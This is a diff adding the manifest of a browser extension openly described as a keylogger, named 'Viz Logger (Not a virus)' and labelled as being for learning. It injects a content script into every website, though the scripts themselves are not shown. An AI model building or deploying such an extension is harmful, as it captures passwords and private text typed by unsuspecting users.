@@ -1,0 +1,18 @@
+{
+  "manifest_version": 2,
+  "name": "Viz Logger (Not a virus)",
+  "version": "1",
+  "icons": {
+    "720": "icon.png"
+  },
+  "description": "Keylogger app for learning purposes",
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "content_scripts": [
+    {
+      "matches": ["*://*/*"],
+      "js": ["content.js"]
+    }
+  ]
+}
